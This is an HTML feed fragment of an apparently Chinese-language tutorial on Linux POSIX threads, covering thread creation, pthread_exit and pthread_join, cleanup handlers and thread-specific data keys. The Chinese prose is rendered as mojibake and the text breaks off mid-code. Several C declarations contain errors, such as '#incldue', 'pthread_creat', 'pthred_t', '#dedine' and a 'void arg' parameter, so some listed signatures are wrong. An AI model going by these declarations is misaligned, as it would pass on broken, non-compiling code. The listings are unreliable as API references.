        <content type="html"><![CDATA[<h1 id="çº¿ç¨‹æ¦‚è¿°"><a href="#çº¿ç¨‹æ¦‚è¿°" class="headerlink" title="çº¿ç¨‹æ¦‚è¿°"></a>çº¿ç¨‹æ¦‚è¿°</h1><p>çº¿ç¨‹æ˜¯è®¡ç®—æœºä¸­ç‹¬ç«‹è¿è¡Œçš„æœ€å°å•ä½ï¼Œè¿è¡Œæ—¶å ç”¨å¾ˆå°‘çš„ç³»ç»Ÿèµ„æºã€‚åœ¨ç”¨æˆ·çœ‹æ¥ï¼Œå¤šä¸ªçº¿ç¨‹æ˜¯åŒæ—¶æ‰§è¡Œï¼Œä½†ä»æ“ä½œç³»ç»Ÿè°ƒåº¦æ¥çœ‹ï¼Œå„ä¸ªçº¿ç¨‹æ˜¯äº¤æ›¿æ‰§è¡Œã€‚ç³»ç»Ÿä¸åœçš„åœ¨å„ä¸ªçº¿ç¨‹ä¹‹é—´åˆ‡æ¢ï¼Œæ¯ä¸ªçº¿ç¨‹åªæœ‰åœ¨ç³»ç»Ÿåˆ†é…ç»™å®ƒçš„æ—¶é—´ç‰‡å†…æ‰èƒ½å–å¾—CPUçš„æ§åˆ¶æƒï¼Œæ‰§è¡Œçº¿ç¨‹ä¸­çš„ä»£ç ã€‚ï¼ˆå¯¹äºå•CPUå•æ ¸çš„æƒ…å†µï¼‰</p><p>é‚£ä¹ˆä¸ºä»€ä¹ˆåœ¨æ”¯æŒå¤šè¿›ç¨‹çš„æƒ…å†µä¸‹åˆå¼•å…¥å¤šçº¿ç¨‹å‘¢ï¼Ÿ</p><ul><li>èŠ‚çº¦èµ„æºï¼ŒèŠ‚çº¦æ—¶é—´ã€‚ä¸æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ç‹¬ç«‹çš„åœ°å€ç©ºé—´ä¸åŒï¼ŒåŒä¸€è¿›ç¨‹å†…çš„çº¿ç¨‹å…±äº«è¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œæ•…åˆ›å»ºæ–°çº¿ç¨‹èŠ±è´¹æ—¶é—´å°‘ï¼Œçº¿ç¨‹é—´çš„åˆ‡æ¢é€Ÿåº¦ä¹Ÿæ¯”è¿›ç¨‹å¿«ã€‚</li><li>å¯ä»¥æé«˜åº”ç”¨ç¨‹åºçš„å“åº”é€Ÿåº¦ã€‚</li><li>å¯ä»¥æé«˜å¤šå¤„ç†å™¨çš„æ•ˆç‡</li><li>å¯ä»¥æ”¹å–„ç¨‹åºçš„ç»“æ„</li></ul><p>è™½ç„¶çº¿ç¨‹åœ¨è¿›ç¨‹å†…éƒ¨å…±äº«åœ°å€ç©ºé—´ï¼Œæ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦ç­‰èµ„æºï¼Œä½†çº¿ç¨‹ä¹Ÿæœ‰å…¶ç§æœ‰çš„æ•°æ®ä¿¡æ¯ï¼ŒåŒ…æ‹¬ï¼š</p><ul><li>çº¿ç¨‹å·ï¼ˆthread ID)</li><li>å¯„å­˜å™¨ [ç¨‹åºè®¡æ•°å™¨,å †æ ˆæŒ‡é’ˆ]</li><li>å †æ ˆ</li><li>ä¿¡å·æ©ç </li><li>ä¼˜å…ˆçº§</li><li>çº¿ç¨‹çš„ç§æœ‰å­˜å‚¨ç©ºé—´</li></ul><h1 id="åˆ›å»ºçº¿ç¨‹"><a href="#åˆ›å»ºçº¿ç¨‹" class="headerlink" title="åˆ›å»ºçº¿ç¨‹"></a>åˆ›å»ºçº¿ç¨‹</h1><p>çº¿ç¨‹çš„åˆ›å»ºé€šè¿‡å‡½æ•° pthread_create æ¥å®Œæˆï¼Œè¯¥å‡½æ•°çš„å£°æ˜å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#incldue<span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_creat</span><span class="params">(<span class="keyword">pthred_t</span> *thread,<span class="keyword">pthread_attr_t</span> *attr,</span></span></span><br><span class="line"><span class="function"><span class="params">                  <span class="keyword">void</span> *(*start_routine)(<span class="keyword">void</span> *), <span class="keyword">void</span> arg)</span></span>;</span><br></pre></td></tr></table></figure><p>å…¶ä½œç”¨æ˜¯ï¼šåˆ›å»ºçº¿ç¨‹å·ä¸ºthreadï¼Œçº¿ç¨‹å±æ€§ä¸ºattrï¼Œæ‰§è¡Œå‚æ•°ä¸ºargçš„start_routineå‡½æ•°çš„çº¿ç¨‹ã€‚</p><p>æ–°åˆ›å»ºçš„çº¿ç¨‹å»è¿è¡ŒæŒ‡é’ˆæŒ‡å‘çš„å‡½æ•°,è€ŒåŸçº¿ç¨‹ç»§ç»­è¿è¡Œã€‚</p><p>åˆ›å»ºçº¿ç¨‹å…¶ä»–ç³»ç»Ÿå‡½æ•°ï¼š</p><table><thead><tr><th>å‡½æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>pthread_t pthread_self(void)</td><td>ç±»ä¼¼äºgetpid(),è·å–çº¿ç¨‹è‡ªèº«çº¿ç¨‹ID</td></tr><tr><td>int pthread_equal(pthread_t thread1,pthread_t thread2)</td><td>åˆ¤æ–­ä¸¤ä¸ªè¿›ç¨‹æ˜¯å¦ä¸ºåŒä¸€è¿›ç¨‹</td></tr><tr><td>int pthread_once(pthread_once_t  * once_control,void(*int_routine)(void))</td><td>ä¿è¯è¯¥å‡½æ•°ä»…æ‰§è¡Œä¸€æ¬¡</td></tr></tbody></table><p>ä¸‹é¢æ¥çœ‹çœ‹å¦‚ä½•åˆ›å»ºè¿›ç¨‹ï¼Œå¦‚ <code>createThread.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">get_thid</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thid;                     <span class="comment">//å£°æ˜è¿›ç¨‹IDå˜é‡</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;parent pthread is me,my thid is %lu\n&quot;</span>,pthread_self( ));</span><br><span class="line">    <span class="keyword">if</span>(pthread_create(&amp;thid,<span class="literal">NULL</span>,(<span class="keyword">void</span> *)get_thid,<span class="literal">NULL</span>) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error!\n&quot;</span>);                 <span class="comment">//è°ƒç”¨å‡½æ•°è¿›è¡Œè¿›ç¨‹çš„åˆ›å»º</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">get_thid</span><span class="params">(<span class="keyword">void</span>)</span>                      <span class="comment">//åˆ›å»ºè¿›ç¨‹æ—¶,è¢«è°ƒç”¨çš„å‡½æ•°</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thid;</span><br><span class="line"></span><br><span class="line">    thid = pthread_self( );</span><br><span class="line">    <span class="keyword">if</span>(thid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I&#x27;m child pthread,my thid is %lu\n&quot;</span>,thid);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/vVmdpJZ7lfYDN1b.png" alt="image-20210213172539505"></p><blockquote><p>ç”±äºpthreadåº“ä¸æ˜¯æ ‡å‡†linuxåº“ï¼Œ éœ€åœ¨ç¼–è¯‘å‘½ä»¤åé¢æ·»åŠ  -lpthread </p></blockquote><h1 id="çº¿ç¨‹ç»ˆæ­¢"><a href="#çº¿ç¨‹ç»ˆæ­¢" class="headerlink" title="çº¿ç¨‹ç»ˆæ­¢"></a>çº¿ç¨‹ç»ˆæ­¢</h1><p>åœ¨Linuxç¯å¢ƒä¸‹,æœ‰ä¸¤ç§æ–¹å¼å®ç°çº¿ç¨‹çš„ç»ˆæ­¢</p><ul><li>è°ƒç”¨returnå‡½æ•°,å®ç°çº¿ç¨‹ç»ˆæ­¢</li><li>ä½¿ç”¨POSIXæ ‡å‡†çš„æ¥å£API,pthread_exitå‡½æ•°</li></ul><p>è¿™ä¸¤ä¸ªå‡½æ•°ä¸»è¦çš„åŒºåˆ«ä¹‹å¤„åœ¨äºåœ¨ä¸»çº¿ç¨‹ä¸­è°ƒç”¨çš„åŒºåˆ«:</p><p>åœ¨ä¸»çº¿ç¨‹ä¸­è°ƒç”¨return/exit,ä¼šä½¿ä¸»çº¿ç¨‹ç»“æŸ,è¿›è€Œæ•´ä¸ªçº¿ç¨‹ç»“æŸ,å…¨éƒ¨çº¿ç¨‹æ¶ˆäº¡</p><p>å¦‚æœæ˜¯è°ƒç”¨pthread_exit( )å‡½æ•°,åˆ™ä¸»çº¿ç¨‹æ¶ˆäº¡å,å…¶ä»–çº¿ç¨‹å¹¶ä¸ä¼šå—åˆ°å½±å“,çŸ¥é“æ‰€æœ‰çº¿ç¨‹ç»“æŸ,è¿›ç¨‹æ‰ä¼šç»“æŸ</p><blockquote><p>çº¿ç¨‹çš„ç»ˆæ­¢æ—¶æœ€é‡è¦çš„é—®é¢˜å°±æ˜¯å…³äºèµ„æºçš„é‡Šæ”¾é—®é¢˜ï¼Œç‰¹åˆ«æ˜¯ä¸€äº›ä¸´ç•Œèµ„æº</p></blockquote><p>ä¸´ç•Œèµ„æºåœ¨åŒä¸€æ—¶é—´åªèƒ½è¢«å…¶ä¸­ä¸€ä¸ªçº¿ç¨‹æ‰€ä½¿ç”¨,å¦‚è‹¥è¢«å¤šä¸ªçº¿ç¨‹ä½¿ç”¨,åˆ™ä¼šå¯¼è‡´èµ„æºæ··ä¹±ã€‚è€Œå¦‚æœä¸´ç•Œèµ„æºç»™ä¸€ä¸ªçº¿ç¨‹æ‰€ä½¿ç”¨,è¯¥çº¿ç¨‹é€€å‡ºæ—¶æ²¡æœ‰é‡Šæ”¾ä¸´ç•Œèµ„æºï¼Œåˆ™å…¶ä»–çº¿ç¨‹ä¼šä¸€ç›´è®¤ä¸ºè¯¥ä¸´ç•Œèµ„æºè¿˜åœ¨è¢«å…¶ä»–çº¿ç¨‹æ‰€å ç”¨ï¼Œå°±ä¼šå¯¼è‡´æ­»é”é—®é¢˜çš„å‡ºç°ã€‚æ­»é”é—®é¢˜çš„å‡ºç°,åœ¨ç¨‹åºè®¾è®¡çš„è¿‡ç¨‹ä¸­ï¼Œå¾€å¾€æ˜¯ç¾éš¾æ€§çš„ï¼Œæ‰€ä»¥ä¸ºäº†å¦¥å–„å¤„ç†çº¿ç¨‹ç»“æŸæ—¶ä¸´ç•Œèµ„æºçš„é‡Šæ”¾é—®é¢˜,Linuxç³»ç»Ÿæä¾›äº†ä¸€å¯¹å‡½æ•°ï¼špthread_cleanup_push()ã€pthread_cleanup_pop()ç”¨äºè‡ªåŠ¨é‡Šæ”¾èµ„æºã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pthread_cleanup_push(routine ,arg) \</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">pthread_cleanup_buffer</span> <span class="title">buffer</span>;</span> \</span><br><span class="line">          _pthread_cleanup_push(&amp;buffer,(routine),(arg));</span><br><span class="line"><span class="meta">#dedine pthread_cleanup_pop  \</span></span><br><span class="line">         _pthread_clean_pop(&amp;buffer,(exeute));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>çº¿ç¨‹ç»ˆæ­¢æ—¶å¦å¤–ä¸€ä¸ªè¦æ³¨æ„çš„é—®é¢˜æ˜¯çº¿ç¨‹é—´çš„åŒæ­¥é—®é¢˜</p></blockquote><p>ä¸€èˆ¬æƒ…å†µä¸‹,è¿›ç¨‹ä¸­å„ä¸ªçº¿ç¨‹çš„è¿è¡Œæ˜¯ç›¸äº’ç‹¬ç«‹çš„,çº¿ç¨‹çš„ç»ˆæ­¢å¹¶ä¸ä¼šç›¸äº’é€šçŸ¥,ç»ˆæ­¢çš„çº¿ç¨‹èµ„æºä»å½’çº¿ç¨‹ç‹¬æœ‰ã€‚æ‰€ä»¥èµ„æºçš„åŒæ­¥ååˆ†é‡è¦,åŒè¿›ç¨‹ä¸­çš„waitå‡½æ•°,åœ¨çº¿ç¨‹ä¸­æ‰€ä½¿ç”¨çš„æ˜¯pthread_join( )å‡½æ•°,å…¶å£°æ˜å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthred.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phread_exit</span><span class="params">(<span class="keyword">void</span> *retval)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_join</span><span class="params">(<span class="keyword">pthread_t</span> thid,<span class="keyword">void</span> *thread_return)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_detach</span><span class="params">(<span class="keyword">pthread_t</span> thid)</span></span>;</span><br></pre></td></tr></table></figure><p>å‡½æ•°pthread_joinç”¨æ¥ä½¿è°ƒç”¨è€…æŒ‚èµ·ç­‰å¾…thidçº¿ç¨‹çš„ç»“æŸ</p><blockquote><p>æ³¨æ„ä¸€ä¸ªçº¿ç¨‹åªèƒ½è¢«å¦ä¸€ä¸ªçº¿ç¨‹æ‰€ç­‰å¾…ï¼Œè‹¥è¢«å¤šä¸ªçº¿ç¨‹ç­‰å¾…ï¼Œå…¶ä¸­ä¸€ä¸ªçº¿ç¨‹æ¢å¤æ¢å¤å°±ç»ªçŠ¶æ€åï¼Œå…¶ä»–çº¿ç¨‹ä¾¿è¿›å…¥äº†æ­»é”ï¼Œå¹¶ä¸”è¢«ç­‰å¾…çš„çº¿ç¨‹å¿…é¡»å¤„äºå¯joinçš„çŠ¶æ€,å³å®ƒä¸èƒ½è¢«è®¾å®šä¸ºDETACHEDï¼ˆå¤„äºDETACHEDçŠ¶æ€çš„çº¿ç¨‹æ˜¯æŒ‡å†…æ ¸ä¸å…³å¿ƒçº¿ç¨‹è¿”å›å€¼,çº¿ç¨‹ç»“æŸå,å†…æ ¸è‡ªåŠ¨å›æ”¶çš„åˆ†ç¦»æ¨¡å¼ï¼‰æ‰€ä»¥ï¼Œä¸ºäº†é˜²æ­¢å†…å­˜æ³„æ¼,å¹¶ä¸”å®Œæˆçº¿ç¨‹åŒæ­¥ï¼Œæ‰€æœ‰çš„çº¿ç¨‹ç»“æŸæ—¶ï¼Œéƒ½è¦è®¾å®šä¸ºDETACHEDæˆ–è€… pthread_join( )ç­‰å¾…</p></blockquote><p>å¦‚ä»¥ä¸‹çº¿ç¨‹ç»ˆæ­¢å®ä¾‹ <code>jointhread.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thid;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;thid,<span class="literal">NULL</span>,(<span class="keyword">void</span> *)test,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(thid,(<span class="keyword">void</span> *)&amp;status);                                     <span class="comment">//ä½¿ä¸»çº¿ç¨‹è¿›è¡Œé˜»å¡,ç­‰å¾…å­çº¿ç¨‹ç»“æŸ</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I  (%lu)  have waited for a long time  %d&quot;</span>,pthread_self( ) ,status);        </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I am for test !\n&quot;</span>);</span><br><span class="line">    sleep(<span class="number">20</span>);                                                  <span class="comment">//ç”¨sleepæ¥å»¶æ—¶å‡½æ•°</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I have achieved!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    pthread_exit(<span class="number">0</span>) ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/i2BJUIHNoTZPQSk.png" alt="image-20210213213237481"></p><p>ä»¥ä¸Šç»“æœå³å¯çœ‹å‡º,è°ƒç”¨å‡½æ•°å¯¹ç›®æ ‡å‡½æ•°å®Œæˆäº†æŒ‚èµ·ç­‰å¾…ã€‚</p><h1 id="ç§æœ‰æ•°æ®"><a href="#ç§æœ‰æ•°æ®" class="headerlink" title="ç§æœ‰æ•°æ®"></a>ç§æœ‰æ•°æ®</h1><p>åŒºåˆ«äºä¹‹å‰æåˆ°çš„ç§æœ‰çš„æ•°æ®ä¿¡æ¯ï¼Œæ­¤å¤„ç§æœ‰æ•°æ®æŒ‡çš„æ˜¯å¤šä¸ªçº¿ç¨‹ä¸­æ“ä½œä¸åŒçš„æ•°æ®ã€‚ä¸åŒçš„çº¿ç¨‹å¯¹ç§æœ‰æ•°æ®çš„è®¿é—®å¯¹å½¼æ­¤ä¹‹é—´æ˜¯ä¸å¯è§çš„ï¼Œæ“ä½œäº’ä¸å½±å“ï¼Œå³é”®åŒåä¸”å…¨å±€ä½†è®¿é—®å†…å­˜ç©ºé—´ä¸åŒã€‚</p><p>åœ¨è¿™é‡Œä¸¾ä¸€ä¸ªç‰¹æ®Šçš„çš„ä¾‹å­ï¼šerrnoå…¨å±€å˜é‡ï¼Œå®ƒè¿”å›æ ‡å‡†çš„å‡ºé”™ä»£ç ã€‚ç†è®ºä¸Šerrnoåº”è¯¥æ˜¯ä»»ä½•çº¿ç¨‹éƒ½å¤Ÿè®¿é—®çš„å…¨å±€å˜é‡ï¼Œä½†æ˜¯å¦‚è‹¥errnoä¸­ä¿å­˜çš„å€¼è¿˜æ²¡æœ‰è¢«ä½¿ç”¨ï¼Œä¾¿è¢«å…¶ä»–çº¿ç¨‹æ›´æ”¹äº†å…¶ä¸­çš„å€¼ï¼ŒåŒæ ·ä¹Ÿä¼šå½±å“ä½¿ç”¨ã€‚åƒè¿™ç§å…¨å±€å˜é‡ï¼Œå³æ˜¯æˆ‘ä»¬æ­¤å¤„è¦è®¨è®ºçš„ç§æœ‰æ•°æ®ï¼Œå³éƒ½èƒ½è®¿é—®çš„å…¨å±€å˜é‡ï¼Œä½†æ˜¯åœ¨å„ä¸ªçº¿ç¨‹ä¸­åˆæ˜¯ä¸ä¸€æ ·çš„å€¼ã€‚</p><p>ç§æœ‰æ•°æ®çš„å®ç°æ–¹å¼å€Ÿç”¨äº†ï¼š<strong>ä¸€é”®å¤šå€¼</strong>ã€‚å¯¹è¿™ä¸ªé”®å¯ä»¥ç†è§£ä¸ºï¼šä¸€ä¸ªæ•°æ®ç®¡ç†å™¨,åœ¨å„ä¸ªçº¿ç¨‹ä¸­,è°ƒç”¨æ—¶,é”®ä¼šè¢«å‘Šè¯‰åœ¨æ­¤çº¿ç¨‹ä¸­åº”è¯¥ä½¿ç”¨ä»€ä¹ˆå€¼ã€‚</p><p>æ“ä½œçº¿ç¨‹ç§æœ‰æ•°æ®çš„å‡½æ•°çš„å£°æ˜å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_key_creat</span> <span class="params">(<span class="keyword">pthread_key_t</span> *key,<span class="keyword">void</span> (*destr funcation) (<span class="keyword">void</span> *))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_setspecific</span> <span class="params">(<span class="keyword">pthred_key_t</span> *key,<span class="keyword">const</span> <span class="keyword">void</span> *pointer)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">pthread_getspecific</span> <span class="params">(<span class="keyword">pthread_key_t</span> key)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_key_delete</span> <span class="params">(<span class="keyword">pthread_key_t</span> key)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>Creatå‡½æ•°æ˜¯ç”¨æ¥åˆ›å»ºé”®çš„</li><li>setspecificå‡½æ•°ç”¨æ¥å°†çº¿ç¨‹çš„ç§æœ‰æ•°æ®ä¸é”®ç»‘å®š,åœ¨çº¿ç¨‹è‡ªèº«ä¸­è°ƒç”¨</li><li>getspecificå‡½æ•°ç”¨æ¥è·å–é”®å€¼ä¸­ç»‘å®šçš„ç§æœ‰æ•°æ®</li><li>deleteå‡½æ•°ç”¨æ¥é”€æ¯é”®</li></ul><blockquote><p>æ³¨æ„ï¼šåœ¨pthread_key_creatå‡½æ•°ä¸­ä½¿ç”¨äº†ææ„å‡½æ•°ã€‚æ‰€è°“ææ„å‡½æ•°æŒ‡çš„æ˜¯ç”¨æ¥åœ¨é”®å€¼ä½¿ç”¨å®Œæˆä¹‹å</p><p>æ¸…é™¤å¹¶é‡Šæ”¾ä¸é”®å€¼ç»‘å®šçš„ç§æœ‰æ•°æ®æ‰€å çš„å†…å­˜ç©ºé—´ã€‚é”®å€¼å¯¹ä¸ç§æœ‰æ•°æ®æ‰€å ç”¨çš„å¹¶ä¸æ˜¯ç›¸åŒçš„æ•°æ®ç©ºé—´ï¼Œæ‰€ä»¥è¦åˆ†å¼€è¿›è¡Œé‡Šæ”¾ã€‚ä¸€æ—¦åœ¨é”®å€¼å¯¹é‡Šæ”¾æ—¶ï¼Œæœªé‡Šæ”¾ç§æœ‰æ•°æ®æ‰€å æ®çš„ç©ºé—´ï¼Œåˆ™ä¼šå¯¼è‡´å†…å­˜æ³„æ¼ï¼Œç¾éš¾æ€§çš„åæœã€‚æ‰€ä»¥è°ƒç”¨ææ„å‡½æ•°æœ‰å…¶ä¸€å®šçš„å¿…è¦æ€§ï¼Œå½“ä¸ºNULLï¼Œä¼šè°ƒç”¨å†…æ ¸è‡ªèº«çš„æ¸…ç†å‡½æ•°ã€‚</p><p>ä¸€èˆ¬æƒ…å†µä¸‹,çº¿ç¨‹è°ƒç”¨mallocä¸ºç§æœ‰æ•°æ®åˆ†é…å†…å­˜ç©ºé—´</p></blockquote><p>ç¤ºä¾‹ <code>tsd.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pthread_key_t</span> key;                <span class="comment">//å®šä¹‰å…¨å±€å˜é‡åº“--é”®</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread1</span><span class="params">(<span class="keyword">void</span> *arg)</span></span>;          <span class="comment">//çº¿ç¨‹1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread2</span><span class="params">(<span class="keyword">void</span> *arg)</span></span>;          <span class="comment">//çº¿ç¨‹2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> tid;                 <span class="comment">//çº¿ç¨‹ID</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main thread begins running!\n&quot;</span>);</span><br><span class="line">    pthread_key_create(&amp;key,<span class="literal">NULL</span>);                        <span class="comment">//å‚æ•°ä¸ºé”®åœ°å€,ä»¥åŠææ„å‡½æ•°(ç”¨äºç§æœ‰æ•°æ®çš„å†…å­˜æ¸…ç†),å¦‚æœä¸ºNULL,åˆ™è°ƒç”¨ç³»ç»Ÿçš„æ¸…ç†å‡½æ•°</span></span><br><span class="line">    pthread_create(&amp;tid,<span 